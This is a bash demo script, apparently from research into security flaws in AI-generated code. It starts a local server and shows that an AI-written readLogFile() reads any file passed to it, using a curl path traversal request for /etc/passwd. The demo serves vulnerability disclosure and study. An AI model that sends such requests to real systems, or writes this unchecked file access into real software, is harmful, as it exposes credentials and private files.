#!/usr/bin/env bash
# Demonstrates path traversal in output/gpt-4/path_002.js.
#
# The AI generated `readLogFile(filename)` that calls fs.readFile() with
# no path normalization or jail. Pass an absolute path and it reads
# anywhere on the filesystem.
#
# Usage:
#   ./run-demo.sh
#
# Run from this directory.

set -e

cd "$(dirname "$0")"

PORT="${PORT:-3091}"

# Install Express if missing
if [ ! -d node_modules ]; then
    echo "=== One-time: installing Express ==="
    npm install --silent
    echo
fi

echo "=== Step 0: start the server in background ==="
PORT="$PORT" node server.js &
SERVER_PID=$!
trap "kill $SERVER_PID 2>/dev/null" EXIT
sleep 1
echo "  server PID: $SERVER_PID (will stop on script exit)"
echo

LOG_FIXTURE="$(pwd)/logs/app.log"
if [ ! -f "$LOG_FIXTURE" ]; then
    echo "Error: missing committed fixture at $LOG_FIXTURE" >&2
    echo "Restore with: git checkout logs/" >&2
    exit 1
fi

echo "=== Step 1: legitimate request (intended use) ==="
echo "  curl 'http://127.0.0.1:$PORT/logs?file=$LOG_FIXTURE'"
curl -s "http://127.0.0.1:$PORT/logs?file=$LOG_FIXTURE" | sed 's/^/    /'
echo

echo "=== Step 2: malicious request (path traversal) ==="
echo "  curl 'http://127.0.0.1:$PORT/logs?file=/etc/passwd'"
echo "  (response, first 20 lines:)"
curl -s "http://127.0.0.1:$PORT/logs?file=/etc/passwd" | head -20 | sed 's/^/    /'
echo

echo "=== Done ==="
echo "The AI-generated readLogFile() opens whatever path the caller supplies."
echo "An attacker reads any file the server process can read — config files,"
echo "credentials, SSH keys, application source code, etc."
